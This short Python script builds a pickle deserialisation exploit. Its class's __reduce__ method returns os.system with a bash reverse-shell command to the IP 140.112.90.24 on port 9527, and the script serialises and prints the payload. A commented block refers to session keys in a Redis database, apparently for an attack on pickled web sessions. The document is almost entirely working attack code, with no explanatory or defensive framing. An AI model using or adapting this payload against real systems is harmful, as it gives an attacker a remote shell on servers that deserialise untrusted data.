# env = python 3.7.5
import pickle, os

class shell_class(object):
    def __reduce__(self):
        reverse_shell = "bash -c 'bash -i >& /dev/tcp/140.112.90.24/9527 0>&1'"
        return (os.system, (reverse_shell, ))

sh = shell_class()
sh_serial = pickle._dumps(sh)
print(sh_serial)
exit(0)
pickle.loads(sh_serial)
'''
Get from session key in redis database
sd = b'\x80\x03}q\x00X\n\x00\x00\x00_permanentq\x01\x88s.'
dsd = pickle.loads(sd)
print(dsd)
'''
